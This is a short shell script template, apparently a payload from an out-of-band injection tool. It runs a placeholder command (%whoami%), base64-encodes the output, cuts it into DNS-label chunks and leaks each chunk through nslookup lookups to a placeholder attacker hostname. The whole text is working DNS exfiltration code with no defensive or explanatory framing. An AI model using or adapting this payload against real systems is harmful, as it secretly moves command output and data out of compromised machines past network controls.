%whoami% 2>&1|base64|while read r; do
	i=1;
	k=0;
	while [ $i -lt ${#r} ]; do
		j=0;
		p=%q%$k.;
		k=$[k+1];
		while [ $[i-1] -lt ${#r} ]&&[ $j -lt 3 ];do
			p=$p`echo $r|cut -c $i-$[i+62]`.;
			i=$[i+63];
			j=$[j+1];
		done
		nslookup ${p}%hostname%
	done;
done;